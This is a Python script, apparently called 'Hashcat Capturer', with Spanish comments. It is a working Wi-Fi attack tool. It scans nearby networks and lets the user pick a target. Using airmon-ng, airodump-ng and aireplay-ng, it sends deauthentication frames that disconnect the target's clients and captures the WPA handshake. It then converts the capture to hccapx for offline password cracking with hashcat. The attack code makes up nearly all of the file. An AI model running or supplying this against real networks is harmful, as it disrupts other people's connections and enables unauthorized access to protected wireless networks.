from scapy.all import *
import wifi
from wifi import Cell, Scheme
from tabulate import tabulate
import subprocess
import os
import time
import signal
import sys

total = 100
def ascii_art():
    logo= r"""


$$\   $$\                     $$\                           $$\            $$$$$$\                       $$\                                             
$$ |  $$ |                    $$ |                          $$ |          $$  __$$\                      $$ |                                            
$$ |  $$ | $$$$$$\   $$$$$$$\ $$$$$$$\   $$$$$$$\ $$$$$$\ $$$$$$\         $$ /  \__| $$$$$$\   $$$$$$\ $$$$$$\   $$\   $$\  $$$$$$\   $$$$$$\   $$$$$$\  
$$$$$$$$ | \____$$\ $$  _____|$$  __$$\ $$  _____|\____$$\\_$$  _|        $$ |       \____$$\ $$  __$$\\_$$  _|  $$ |  $$ |$$  __$$\ $$  __$$\ $$  __$$\ 
$$  __$$ | $$$$$$$ |\$$$$$$\  $$ |  $$ |$$ /      $$$$$$$ | $$ |          $$ |       $$$$$$$ |$$ /  $$ | $$ |    $$ |  $$ |$$ |  \__|$$$$$$$$ |$$ |  \__|
$$ |  $$ |$$  __$$ | \____$$\ $$ |  $$ |$$ |     $$  __$$ | $$ |$$\       $$ |  $$\ $$  __$$ |$$ |  $$ | $$ |$$\ $$ |  $$ |$$ |      $$   ____|$$ |      
$$ |  $$ |\$$$$$$$ |$$$$$$$  |$$ |  $$ |\$$$$$$$\\$$$$$$$ | \$$$$  |      \$$$$$$  |\$$$$$$$ |$$$$$$$  | \$$$$  |\$$$$$$  |$$ |      \$$$$$$$\ $$ |      
\__|  \__| \_______|\_______/ \__|  \__| \_______|\_______|  \____/        \______/  \_______|$$  ____/   \____/  \______/ \__|       \_______|\__|      
                                                                                              $$ |                                                       
                                                                                              $$ |                                                       
                                                                                              \__|                                                       

"""
    return logo

print(ascii_art())

interface_name=None


# Define la función que muestra la barra de progreso
def progress_bar(current, total, bar_length=50):
    percent = float(current) * 100 / total
    arrow = '-' * int(percent / 100 * bar_length - 1) + '>'
    spaces = ' ' * (bar_length - len(arrow))

    sys.stdout.write('\rProgreso: [%s%s] %d%%' % (arrow, spaces, percent))
    sys.stdout.flush()


def restart_adapter():
	subprocess.run(["sudo","airmon-ng","check","kill"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
	subprocess.run(["sudo","ip","link","set",interface_name,"down"])
	subprocess.run(["sudo","iwconfig",interface_name,"mode","managed"])
	subprocess.run(["sudo","ip","link","set",interface_name,"up"])
	subprocess.run(["sudo","systemctl","restart","NetworkManager"])
	
table_headers = ["Num","SSID","Address","Encryption type", "Channel", "Signal"]
table_data = []
wifi_networks2=[]

#ELIMINAR ARCHIVOS
# Obtiene la ruta del directorio actual del script
ruta_actual = os.path.dirname(os.path.abspath(__file__))
# Comando para eliminar los archivos que empiezan con "captura"
comando = f'rm -f {ruta_actual}/captura*'
# Ejecuta el comando
subprocess.run(comando, shell=True)

# Escanear redes Wi-Fi cercanas
def scan_wifi():
    print("{+}   Wi-Fi interfaces available:")
    interfaces = get_if_list()
    wifi_interfaces = [interface for interface in interfaces if interface.startswith("wlan")]
    for i, interface in enumerate(wifi_interfaces):
        print(f"{i+1}. {interface}")
    interface_num = int(input("{+}   Select the number of the Wi-Fi interface to use: \n"))
    global interface_name
    interface_name = wifi_interfaces[interface_num-1]
    wifi_networks = []
    restart_adapter()
    
    print(f"\nScanning Wi-Fi networks in the interface'{interface_name}'...\n")
    interface =wifi.Cell()
    #progress bar para escanear red
    for i in range(total):
        time.sleep(0.05)  # Tarea que lleva tiempo  === 5"segundos" / 100 "-"
        progress_bar(i + 1, total)
    print("")
    cells = interface.all(interface_name)
    for i, cell in enumerate(cells,start=1):
        ssid = cell.ssid
        Address= cell.address
        encryption_type = cell.encryption_type if cell.encryption_type is not None else "Unknown"
        channel= cell.channel
        signal= cell.signal
        wifi_networks2.append([i,ssid,Address,encryption_type, channel, signal])
        table_data.append([i,ssid,Address,encryption_type, channel, signal])
    print(tabulate(table_data, headers=table_headers, tablefmt="fancy_grid",numalign="left"))
    # Imprimir resultados
    print("\nScan results:")
    print(f"Selected Wi-Fi interface {interface_name}\n")
    for i, (ssid, address, encryption_type) in enumerate(wifi_networks):
        print(f"{i+1}. {ssid} ({address}) - {encryption_type}")

    return wifi_networks,wifi_networks2


# Escanear redes Wi-Fi y mostrar resultados
networks = scan_wifi()
# Permitir al usuario elegir una red Wi-Fi específica
network_num = int(input("\n {+}   Select the number of the Wi-Fi network to connect to: "))
selection =(wifi_networks2[network_num -1])
"""print('CHECK ----------------')
print(f"BSSI==",selection[2]," interfaz==",f"{interface_name}"," CANAL==",selection[4])
"""
restart_adapter()

subprocess.run(["sudo","airmon-ng","start",interface_name],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
subprocess.run(["sudo","airmon-ng","check","kill"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)


# Iniciar el proceso
process = subprocess.Popen(["sudo","airodump-ng","--bssid",selection[2],'-w','captura','-c',str(selection[4]),interface_name], stdout=subprocess.PIPE)
process_aire = subprocess.Popen(["sudo","aireplay-ng","-0",'10','-a',selection[2],interface_name], stdout=subprocess.PIPE)
pid= process.pid # AIRODUMP-NG PROCESS
pid2= process_aire.pid # AIREPLAY-NG PROGRESS


#progress bar para hacer kill al proceso aireplay-ng

for i in range(total):
    time.sleep(0.2)  # Tarea que lleva tiempo  === 20"segundos" / 100 "-"
    progress_bar(i + 1, total)

sys.stdout.write('\n')  # linea en blanco para evitar sobrescribir la barra de progreso
os.kill(pid2, signal.SIGINT) # KILL DEAUTH

print("DEAUTH COMPLETED, WAIT FOR THE CLIENT TO CONNECT")
#progress bar para hacer kill al proceso airodump-ng
for i in range(total):
    time.sleep(0.2) 
    progress_bar(i + 1, total)

sys.stdout.write('\n')  # Anade una linea en blanco para evitar sobrescribir la barra de progreso
os.kill(pid, signal.SIGINT) # KILL AIRODUMP-NG 

### CAP TO HCCAPX
subprocess.run(["/usr/bin/cap2hccapx","captura-01.cap","nombre.hccapx"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

#ELIMINAR ARCHIVOS
comando = f'rm -f {ruta_actual}/captura*'
# Ejecuta el comando
subprocess.run(comando, shell=True)

#Restablecer red wifi
subprocess.run(["sudo","iwconfig",interface_name,"mode","managed"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
subprocess.run(["sudo","systemctl","restart","NetworkManager"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)


logo2 = r'''
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNXK000000KXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWN0dl:'...    ...';lx0NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMWXkocccccccccccccccccccc:'.                  .':ccccccccccccccccccccokXWMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMWXx:.                                                            .:xXWMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMW0l.                                                        .l0WMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMWKl.                                                    .lKWMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMW0:                                                  :0WMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMNo.                                              .oNMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMWd.                                            .dNMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMNd.                                          .dNMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMX:                                          :XMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMWo                                          oWMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMd.                                        .dMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMM0'    .;,.                        .,;.    '0MMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMNo     c00o;.                  .;o00c     oNMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMX:     ;OWWKxc'.          .'cxKWWO;     :XMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:     .cOXWWN0c        c0NMWXOc.     :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXo.      .;coo;        ;ooc;.      .oXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:.                            .:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWOc.                        .cOWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMWNWMMMMMMMMMMMMMMMMMMMWXkc,.                .,ckXWMMMMMMMMMMMMMMMMMMMWNWMMMMMMMMMMMMMM
MMMMMMMMMMMMMXxOWMMMMMMMMMMMMMMMMMMMMMMMNKx'            'xKNMMMMMMMMMMMMMMMMMMMMMMMWOxXMMMMMMMMMMMMM
MMMMMMMMMMMMX::KMMMMMMMMMMMMMMMMMMMMMMMMMMK,            ,KMMMMMMMMMMMMMMMMMMMMMMMMMMK::XMMMMMMMMMMMM
MMMMMNXNMMMNl.cNMMMMMMMMMMMMMMMMMMMMMMMMMWo.             oWMMMMMMMMMMMMMMMMMMMMMMMMMNc.lNMMMNXNMMMMM
MMMMKokWMMMO' lWMMMMMMMMMMMMMMMMMMMMMMMMMO'              'OMMMMMMMMMMMMMMMMMMMMMMMMMWl .OMMMWkoKMMMM
MMM0;;KMMMMd. cNMMMMMMMMMMMMMMMMMMMMMMMM0,                ,0MMMMMMMMMMMMMMMMMMMMMMMMNc .dWMMMK:,0MMM
MMK; lWMMMWd  ,KMMMMMMMMMMMMMMMMMMMMMMWO,                  ,OWMMMMMMMMMMMMMMMMMMMMMMK,  dWMMMWl ;KMM
MNl .dWMMMMx. .dWMMMMMMMMMMMMMMMMMMMMXo.                    .oXMMMMMMMMMMMMMMMMMMMMWd. .xMMMMWd. lNM
M0' .xMMMMMK,  .dNMMMMMMMMMMMMMMMMWKo'                        'oKWMMMMMMMMMMMMMMMMNd.  ,KMMMMMx. '0M
Mx. .dMMMMMWd.  .:kXWMMMMMMMMMWN0d:.                            .:d0NMMMMMMMMMMWXk:   .dWMMMMMd. .xM
Wo   lWMMMMMNo.    ':oxkOOkxdl:'.                                  .':ldxkOOkxo:.    .oNMMMMMWl   oW
Wd.  ,0MMMMMMNx'                                                                    'xNMMMMMM0,  .dW
MO.   lNMMMMMMMXd,.                                                              .,dXMMMMMMMNl   .kM
MX:   .lXMMMMMMMMN0dc,...   ...'.                                  .'..     ..,cd0NMMMMMMMMXl.   ;XM
MWk.    ,kNMMMMMMMMMMWXK0OOOko:'                                    ':dkOOO0KXWMMMMMMMMMMNk,    .kWM
MMNo.     'lkKNWMMMMMWWXKko:'                                          ':okKXWWMMMMWWNKkl'     .oNMM
MMMNo.       ..,::cc:;,..                                                  ..,;:cc::,..       .oNMMM
MMMMWO;                                 ...',;:cccccc:;,'...                                 ;OWMMMM
MMMMMMNk:.                     ..';cldxO0KNNWWMMMMMMMMWWNNX0Oxdlc;'..                     .:kNMMMMMM
MMMMMMMMWKd:'.             .,lk0XNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNX0kl,.             .':dKWMMMMMMMM
MMMMMMMMMMMWNKkdolcc:ccloxOXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXOxolcc:ccloxOKNWMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM

'''

print(logo2)
